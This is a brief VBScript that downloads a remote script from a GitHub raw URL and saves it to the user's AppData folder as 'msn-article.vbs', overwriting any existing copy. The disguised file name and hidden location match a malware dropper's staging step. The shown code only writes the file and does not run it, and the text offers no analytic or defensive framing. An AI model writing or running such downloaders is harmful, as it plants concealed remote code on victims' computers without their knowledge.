Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
Dim obj: Set obj = CreateObject("wscript.shell")
xHttp.Open "GET", "https://raw.githubusercontent.com/mr-slugworth/scripts/master/command.vbs", False
xHttp.Send
bStrm.Type = 1 '//binary
bStrm.Open
bStrm.write xHttp.responseBody
bStrm.savetofile obj.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\msn-article.vbs"), 2 '//overwrite
bStrm.Close
